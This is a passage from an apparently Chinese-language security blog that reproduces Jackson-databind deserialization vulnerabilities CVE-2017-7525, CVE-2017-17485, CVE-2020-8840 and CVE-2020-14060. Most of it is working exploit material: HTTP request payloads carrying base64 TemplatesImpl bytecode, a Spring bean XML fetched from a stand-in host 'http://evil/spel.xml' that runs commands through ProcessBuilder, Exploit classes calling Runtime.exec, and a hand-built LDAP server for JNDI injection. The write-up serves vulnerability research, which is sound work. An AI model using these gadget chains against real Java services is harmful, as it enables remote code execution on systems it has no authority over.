class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（4）、Id.NAME<br>这种输出方式没有携带类名字，在反序列化时也是不可以利用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"Height"</span>,<span class="string">"h"</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（5）、Id.COSTOM<br>这个无法直接用，需要手写一个解析器才可以配合使用，所以直接回抛出异常。</p><h1 id="Jackson反序列化-CVE-2017-7525"><a href="#Jackson反序列化-CVE-2017-7525" class="headerlink" title="Jackson反序列化(CVE-2017-7525)"></a>Jackson反序列化(CVE-2017-7525)</h1><p>根据触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞</p><ul><li>Jackson 2.7版本（&lt;2.7.10）、2.8版本（&lt;2.8.9）</li><li>调用了enableDefaultTyping方法</li><li>反序列化的类可控</li></ul><p><strong>漏洞复现：</strong><br>本漏洞利用条件如下：</p><ul><li><p>开启 JacksonPolymorphicDeserialization，即调用以下任意方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objectMapper.enableDefaultTyping(); <span class="comment">// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br></pre></td></tr></table></figure></li><li><p>Target class 需要有无参 constructor</p></li><li><p>Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口</p></li></ul><p>Jackson-databind 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 SetterlessProperty 调用 getter 方法，获取变量，然后设置变量值。当调用 getOutputProperties() 方法时，会初始化 transletBytecodes 包含字节码的类，导致命令执行，具体可参考 java-deserialization-jdk7u21-gadget-note 中关于 TemplatesImpl 的说明。</p><p>使用JDK7u21的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl作为Gadget，发送如下请求，将会执行touch /tmp/prove1.txt：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /exploit HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 1298</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "param": [</span></span><br><span class="line"><span class="comment">    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      "transletBytecodes": [</span></span><br><span class="line"><span class="comment">  "yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw=="</span></span><br><span class="line"><span class="comment">      ],</span></span><br><span class="line"><span class="comment">      "transletName": "a.b",</span></span><br><span class="line"><span class="comment">      "outputProperties": &#123;&#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  ]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>这个POC只能运行在目标为JDK7u21以下的环境中，其他情况请更换Gadget。   </p><h1 id="Jackson反序列化-CVE-2017-17485"><a href="#Jackson反序列化-CVE-2017-17485" class="headerlink" title="Jackson反序列化(CVE-2017-17485)"></a>Jackson反序列化(CVE-2017-17485)</h1><p>针对CVE-2017-7525 黑名单修复 绕过，利用了 org.springframework.context.support.FileSystemXmlApplicationContext。</p><p>利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如 <a href="http://evil/spel.xml，" target="_blank" rel="noopener">http://evil/spel.xml，</a>   内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=<span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">       xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">"</span></span><br><span class="line"><span class="string">     http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">     http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="line"><span class="string">"</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">"pb"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">                &lt;value&gt;touch&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;/tmp/prove2.txt&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;property name=<span class="string">"any"</span> value=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>然后，发送如下数据包，使Jackson加载bean，触发漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /exploit HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 138</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "param": [</span></span><br><span class="line"><span class="comment">    "org.springframework.context.support.FileSystemXmlApplicationContext",</span></span><br><span class="line"><span class="comment">    "http://evil/spel.xml"</span></span><br><span class="line"><span class="comment">  ]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>成功执行touch /tmp/prove2.txt<br>原理： 利用 FileSystemXmlApplicationContext 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 start() 方法实现命令执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>环境<br>App.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by liaoxinxi on 2017-12-11.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        testSpringFramework();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testSpringFramework</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        <span class="comment">// 假设这是攻击者可以控制的请求包payload</span></span><br><span class="line">        String payload = <span class="string">"[\"org.springframework.context.support.ClassPathXmlApplicationContext\", "</span> +</span><br><span class="line">                <span class="string">"\"http://127.0.0.1/spel.xml\"]\n"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启web服务，并将如下的spel.xml文件放入根目录中     </p><p>spel.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">       xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">     http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">     http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">    &lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">       &lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">        &lt;property name&#x3D;&quot;any&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure><h1 id="Jackson-databind-反序列化-CVE-2020-8840"><a href="#Jackson-databind-反序列化-CVE-2020-8840" class="headerlink" title="Jackson-databind 反序列化 (CVE-2020-8840)"></a>Jackson-databind 反序列化 (CVE-2020-8840)</h1><p>这个CVE利用xbean-reflect利用链造成JNDI注入<br>影响版本：2.0.0 - 2.9.10.2</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>起一个web服务器，并将编译的Exploit.class放入根目录中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>Exploit.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>marshalsec开启LDAP服务 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CVE-2020-14060"><a href="#CVE-2020-14060" class="headerlink" title="CVE-2020-14060"></a>CVE-2020-14060</h1><p>影响范围   </p><ul><li>jackson-databind before 2.9.10.4</li><li>jackson-databind before 2.8.11.6</li><li>jackson-databind before 2.7.9.7</li></ul><p>利用条件   </p><ul><li>开启enableDefaultTyping()</li><li>使用了org.apache.drill.exec:drill-jdbc-all第三方依赖</li></ul><p>pom.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.9.10.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.drill.exec&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;drill-jdbc-all&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.7.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;jta&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">         &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line">  &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.aoju/bus-core --&gt;</span></span><br></pre></td></tr></table></figure><p>PS：这里的漏洞所使用的库包需要在1.4版本才可以，之后没有该漏洞类，而目前最新的已经是1.17.0了，所以总体来说较为鸡肋~     </p><p>启动web服务，并放入编译好的badClassName.class文件         </p><p>badClassName.java    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">badClassName</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">badClassName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动LDAPServer 服务   </p><p>LDAPServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LDAPServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8888/#badClassName"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span 